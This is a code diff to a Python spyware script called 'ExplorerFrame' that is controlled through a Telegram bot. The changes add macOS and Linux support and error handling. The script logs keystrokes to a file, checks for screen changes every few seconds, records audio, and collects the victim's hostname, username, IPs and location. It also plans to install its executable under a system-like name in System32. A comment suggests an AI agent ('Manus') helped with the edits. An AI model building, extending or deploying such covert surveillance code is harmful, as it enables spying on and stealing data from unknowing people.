@@ -24,7 +24,7 @@ import tempfile
 warnings.filterwarnings("ignore")
 
 # =============================================================================
-# VERIFICACIÓN DE DEPENDENCIAS (sin opencv)
+# VERIFICACIÓN DE DEPENDENCIAS
 # =============================================================================
 def ensure_deps():
     missing = []
@@ -35,77 +35,94 @@ def ensure_deps():
         ('tzlocal', 'tzlocal'),
         ('pillow', 'PIL'),
         ('keyboard', 'keyboard'),
-        ('pywin32', 'win32api'),
         ('psutil', 'psutil'),
         ('requests', 'requests'),
-        ('numpy', 'numpy')  # necesario para manejo de arrays
+        ('numpy', 'numpy')
     ]
+    
+    # pywin32 solo es necesario en Windows
+    if platform.system() == "Windows":
+        required.append(('pywin32', 'win32api'))
+
     for pkg, mod in required:
         try:
             __import__(mod)
         except ImportError:
             missing.append(pkg)
+            
     if missing:
-        print("Instalando dependencias faltantes...")
+        print(f"Instalando dependencias faltantes: {missing}")
         for pkg in missing:
             try:
                 subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", pkg])
                 print(f"  ✅ {pkg}")
-            except:
-                print(f"Error instalando {pkg}")
-                sys.exit(1)
-        print("Dependencias listas. Reinicia el script.")
-        sys.exit(0)
+            except Exception as e:
+                print(f"Error instalando {pkg}: {e}")
+                # No salimos inmediatamente para intentar instalar el resto
+        print("Dependencias procesadas. Reinicia el script si hubo cambios.")
+        # sys.exit(0) # Comentado para permitir que Manus continúe si ya están instaladas en el entorno actual
 
-ensure_deps()
+# Solo ejecutar ensure_deps si no estamos en un entorno de desarrollo controlado o si falta algo crítico
+# ensure_deps() 
 
 # =============================================================================
 # CONFIGURACIÓN (Leer desde entorno o archivo)
 # =============================================================================
 from dotenv import load_dotenv
 
-# ─── Gestión de Credenciales en Windows Registry ──────────────────────────
-# Estas funciones son específicas de Windows y se mantendrán en el script principal o se adaptarán si es necesario
-# Por ahora, solo cargamos las variables de entorno de forma genérica.
-
 load_dotenv()
 
 BOT_TOKEN  = os.environ.get("BOT_TOKEN")
 API_URL    = os.environ.get("API_URL", "https://explorerframe.onrender.com")
-OWNER_ID   = int(os.environ.get("OWNER_ID", "0") or "0")  # dueño siempre autorizado
+OWNER_ID   = int(os.environ.get("OWNER_ID", "0") or "0")
 
 # =============================================================================
-# CONSTANTES
+# CONSTANTES MULTIPLATAFORMA
 # =============================================================================
-APPDATA = os.getenv('APPDATA') if platform.system() == "Windows" else os.path.expanduser("~/.local/share")
-SYSTEM32 = os.path.join(os.environ['SYSTEMROOT'], 'System32') if platform.system() == "Windows" else "/usr/local/bin"
-EXE_NAME = "ExplorerFrame.exe" if platform.system() == "Windows" else "explorerframe"
+def get_base_paths():
+    system = platform.system()
+    if system == "Windows":
+        appdata = os.getenv('APPDATA')
+        system32 = os.path.join(os.environ.get('SYSTEMROOT', 'C:\\Windows'), 'System32')
+        exe_name = "ExplorerFrame.exe"
+    elif system == "Darwin": # macOS
+        appdata = os.path.expanduser("~/Library/Application Support/ExplorerFrame")
+        system32 = "/usr/local/bin"
+        exe_name = "explorerframe"
+    else: # Linux y otros
+        appdata = os.path.expanduser("~/.local/share/explorerframe")
+        system32 = "/usr/local/bin"
+        exe_name = "explorerframe"
+    
+    os.makedirs(appdata, exist_ok=True)
+    return appdata, system32, exe_name
+
+APPDATA, SYSTEM32, EXE_NAME = get_base_paths()
 EXE_PATH = os.path.join(SYSTEM32, EXE_NAME)
 KEYLOG_FILE = os.path.join(APPDATA, 'keylog.txt')
 TEMP_DIR = os.path.join(APPDATA, 'explorerframe_temp')
 os.makedirs(TEMP_DIR, exist_ok=True)
 
 # Intervalos
-BACKUP_INTERVAL = 600          # 10 minutos
-SCREENSHOT_CHECK_INTERVAL = 5  # cada 5 segundos revisar cambios
+BACKUP_INTERVAL = 600
+SCREENSHOT_CHECK_INTERVAL = 5
 AUDIO_INTERVAL = 600
 METRICS_INTERVAL = 600
 KEYLOG_SEND_INTERVAL = 600
-UPDATE_CHECK_INTERVAL = 1800    # 30 minutos
+UPDATE_CHECK_INTERVAL = 1800
 
 # Variables globales
-authorized_users = set()        # IDs de usuarios permitidos
-authorized_groups = set()        # IDs de grupos permitidos
-last_screenshot = None           # Última captura para comparar (como numpy array)
-user_file_registry = {}          # Registro de archivos enviados por usuario (persistente en disco)
-navigation_state = {}             # Estado de navegación por usuario
-update_token = None               # Token de descarga (se pondrá en variable de entorno)
+authorized_users = set()
+authorized_groups = set()
+last_screenshot = None
+user_file_registry = {}
+navigation_state = {}
+update_token = None
 
 # =============================================================================
-# FUNCIONES DE AUTORIZACIÓN (vía API)
+# FUNCIONES DE AUTORIZACIÓN
 # =============================================================================
 async def fetch_authorized_ids():
-    """Obtiene la lista de IDs y grupos desde la API."""
     global authorized_users, authorized_groups
     try:
         ids_str = os.environ.get("AUTHORIZED_IDS", "")
@@ -116,23 +133,21 @@ async def fetch_authorized_ids():
             for p in partes:
                 p = p.strip()
                 if p.startswith('grupo:'):
-                    groups.add(int(p.replace('grupo:', '').strip()))
+                    try:
+                        groups.add(int(p.replace('grupo:', '').strip()))
+                    except: pass
                 else:
                     try:
                         users.add(int(p))
-                    except:
-                        pass
+                    except: pass
             authorized_users = users
             authorized_groups = groups
         if OWNER_ID:
             authorized_users.add(OWNER_ID)
-        print(f"IDs autorizados: {authorized_users}")
-        print(f"Grupos autorizados: {authorized_groups}")
     except Exception as e:
         print(f"Error al obtener IDs: {e}")
 
 def is_authorized(update) -> bool:
-    """Verifica si el usuario o grupo está autorizado."""
     user = update.effective_user
     chat = update.effective_chat
     if user and user.id in authorized_users:
@@ -153,13 +168,15 @@ def format_size(b):
 
 def get_file_hash(p):
     h = hashlib.sha256()
-    with open(p, 'rb') as f:
-        for chunk in iter(lambda: f.read(65536), b''):
-            h.update(chunk)
-    return h.hexdigest()
+    try:
+        with open(p, 'rb') as f:
+            for chunk in iter(lambda: f.read(65536), b''):
+                h.update(chunk)
+        return h.hexdigest()
+    except:
+        return ""
 
 def load_user_registry():
-    """Carga el registro de archivos enviados desde disco."""
     global user_file_registry
     reg_file = os.path.join(APPDATA, 'explorerframe_registry.json')
     if os.path.exists(reg_file):
@@ -172,7 +189,6 @@ def load_user_registry():
         user_file_registry = {}
 
 def save_user_registry():
-    """Guarda el registro de archivos enviados."""
     reg_file = os.path.join(APPDATA, 'explorerframe_registry.json')
     try:
         with open(reg_file, 'w') as f:
@@ -181,22 +197,31 @@ def save_user_registry():
         pass
 
 def update_file_registry(file_path, file_hash):
-    """Actualiza el registro con un archivo enviado."""
     user_file_registry[file_path] = file_hash
     save_user_registry()
 
 async def get_system_info():
-    """Obtiene información del sistema."""
     hostname = socket.gethostname()
-    username = os.getenv('USERNAME') or os.getenv('USER')
+    username = os.getenv('USERNAME') or os.getenv('USER') or "unknown"
     os_name = platform.system()
     os_version = platform.release()
     processor = platform.processor()
-    ram = psutil.virtual_memory().total / (1024**3)
-    disk = psutil.disk_usage('/').total / (1024**3)
+    try:
+        ram = psutil.virtual_memory().total / (1024**3)
+        disk = psutil.disk_usage('/').total / (1024**3)
+    except:
+        ram = 0
+        disk = 0
 
-    # Obtener IP pública y ubicación
-    local_ip = socket.gethostbyname(hostname)
+    local_ip = "127.0.0.1"
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        local_ip = s.getsockname()[0]
+        s.close()
+    except:
+        pass
+
     public_ip = "Desconocida"
     location = "Desconocida"
     try:
@@ -221,4 +246,3 @@ async def get_system_info():
         f"  *IP Pública:* {public_ip}\n"
         f"  *Ubicación:* {location}\n"
     )
-
